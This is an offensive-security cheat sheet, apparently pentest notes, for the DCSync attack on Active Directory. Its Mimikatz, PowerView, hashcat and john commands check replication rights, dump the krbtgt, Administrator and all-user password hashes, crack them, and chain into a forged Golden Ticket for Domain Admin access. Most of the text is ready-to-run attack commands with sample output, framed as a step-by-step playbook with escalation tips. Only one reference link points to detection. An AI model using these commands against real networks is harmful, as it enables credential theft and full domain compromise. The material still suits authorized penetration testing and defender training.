# DCSync Attack

## Overview

**DCSync** is an attack where an adversary impersonates a Domain Controller to request **replication data from Active Directory**. This data includes **NTLM password hashes**, Kerberos keys, and other secrets of domain users — including **`krbtgt`**, **`Administrator`**, and service accounts.

The attack abuses the **Directory Replication Service (DRS)** API via the `DRSUAPI` RPC interface.

---

## Requirements

To run a DCSync attack, the attacker must have **one of the following privileges** on the domain:

- **Domain Admin**
    
- **Enterprise Admin**
    
- Any user or group with **Replicating Directory Changes** and **Replicating Directory Changes All** rights on the domain object
    

> Tip: These permissions can be granted **indirectly** (e.g., via ACL misconfig or GenericAll on the domain object — BloodHound helps detect this).

---

## Step 1: Check for Replication Permissions

### With PowerView (Post-Shell)

```powershell
Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "Replicating" }
```

### With BloodHound

Use the built-in query:

```cypher
Find all principals with DCSync rights
```

> Graph shows all users/groups with replication permissions.

---

## Step 2: Run DCSync with Mimikatz

> Must be run as a user with the appropriate privileges.

### Dump `krbtgt` Hash

```mimikatz
lsadump::dcsync /domain:corp.local /user:krbtgt
```

### Dump `Administrator` Hash

```mimikatz
lsadump::dcsync /domain:corp.local /user:Administrator
```

### Dump All Users (Heavy Noise)

```mimikatz
lsadump::dcsync /domain:corp.local /all
```

### Dump Specific User in Another Domain (if trust exists)

```mimikatz
lsadump::dcsync /domain:child.corp.local /user:svc_sql
```

---

## Output Example

```text
SAM Username : krbtgt
NTLM        : 1693c6cefafffc7af11ef34d1c788f47
```

Once you have the NTLM hash:

- Use it for Golden Ticket attacks (krbtgt)
    
- Use it for Pass-the-Hash (Administrator)
    
- Crack it offline if needed
    

---

## Step 3: Crack the Hash (Optional)

### With hashcat:

```bash
hashcat -m 1000 krbtgt.hash rockyou.txt
```

### With john:

```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt krbtgt.hash
```

---
## Practical Usage Flow (From Admin Shell)

```powershell
privilege::debug
lsadump::dcsync /domain:corp.local /user:krbtgt
kerberos::golden /krbtgt:<hash> /domain:corp.local /sid:S-1-5-21-xxx... /user:admin /ptt
```

This results in **forged Domain Admin access** via Golden Ticket.

---

## Summary: DCSync

|Task|Tool/Command|
|---|---|
|Check replication rights|`Get-ObjectAcl` or BloodHound|
|Dump krbtgt hash|`lsadump::dcsync /user:krbtgt`|
|Dump admin hash|`lsadump::dcsync /user:Administrator`|
|Dump all users|`lsadump::dcsync /all`|
|Use hash|For Golden Ticket or Pass-the-Hash attacks|
|Crack offline (optional)|`hashcat -m 1000`, `john --format=NT`|

---

## Notes

- DCSync does **not interact with LSASS** — it's stealthier in memory, but very noisy in logs
    
- If you find **GenericAll** or **GenericWrite** on the domain object, escalate to DCSync rights
    
- Works even across **trusted domains** if rights exist
    
- Golden Ticket requires the **krbtgt** hash from DCSync
    

---

## References

- [ADSecurity: DCSync](https://adsecurity.org/?p=1729)
    
- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
    
- [BloodHound for DCSync Pathing](https://bloodhound.readthedocs.io/en/latest/)
    
- [Microsoft Event IDs for DCSync Detection](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4662)
    z